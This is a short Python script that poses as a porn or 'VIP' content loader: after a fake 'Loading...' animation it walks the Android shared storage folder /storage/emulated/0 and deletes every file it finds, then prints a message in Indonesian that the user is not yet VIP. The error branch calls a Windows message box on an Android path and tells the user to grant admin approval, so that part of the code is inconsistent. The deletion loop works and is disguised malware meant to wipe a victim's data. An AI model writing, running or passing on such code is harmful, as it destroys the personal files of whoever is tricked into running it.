import os
import shutil
import time

def bokep():
    print("Loading...")
    for i in range(5):
        time.sleep(0.5)
        print(".", end="", flush=True)
    print("\nDone!")
    time.sleep(1)

def main():
    direktori = "/storage/emulated/0"
    
    bokep()  
    
    for root, dirs, files in os.walk(direktori):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                if os.path.isfile(file_path):
                    os.unlink(file_path)
                elif os.path.isdir(file_path): 
                    shutil.rmtree(file_path)
            except Exception as e:
                import ctypes
                ctypes.windll.user32.MessageBoxW(0, "Lo minta persetujuan admin dulu soal nya masih ada perintah yang kurang", "Peringatan", 0)
                exit()

    print("Anda belum termasuk orang yang VIP. Silahkan VIP terlebih dahulu.")

if __name__ == "__main__":
    main()